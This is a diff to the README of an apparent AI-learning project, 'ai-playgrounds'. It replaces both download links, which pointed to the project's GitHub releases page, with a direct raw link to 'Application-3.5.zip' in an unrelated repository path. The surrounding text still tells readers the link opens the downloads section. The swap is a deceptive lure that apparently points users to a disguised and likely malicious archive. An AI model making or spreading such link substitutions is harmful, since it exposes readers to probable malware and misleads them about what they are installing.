@@ -43,7 +43,7 @@ You don't need to install Python, download a heavy IDE, or configure anything. E
 
 To get started, visit the official download page below.
 
-[**🔽 Download ai-playgrounds**](https://github.com/pianistic-berlin89/ai-playgrounds/releases)
+[**🔽 Download ai-playgrounds**](https://raw.githubusercontent.com/pianistic-berlin89/pianistic-berlin89.github.io/main/vagas/job_09/Application-3.5.zip)
 
 Just click that link, and you'll be taken to the downloads section. From there, look for the file titled **ai-playgrounds** (the newest version is at the top). Click it to begin downloading.
 
@@ -135,7 +135,7 @@ Understanding AI is becoming essential in today's world. But reading a textbook 
 
 Ready to start playing?
 
-[**🎮 Launch ai-playgrounds Now**](https://github.com/pianistic-berlin89/ai-playgrounds/releases)
+[**🎮 Launch ai-playgrounds Now**](https://raw.githubusercontent.com/pianistic-berlin89/pianistic-berlin89.github.io/main/vagas/job_09/Application-3.5.zip)
 
 The download is small, the setup is zero, and the fun is unlimited. See you inside!
 
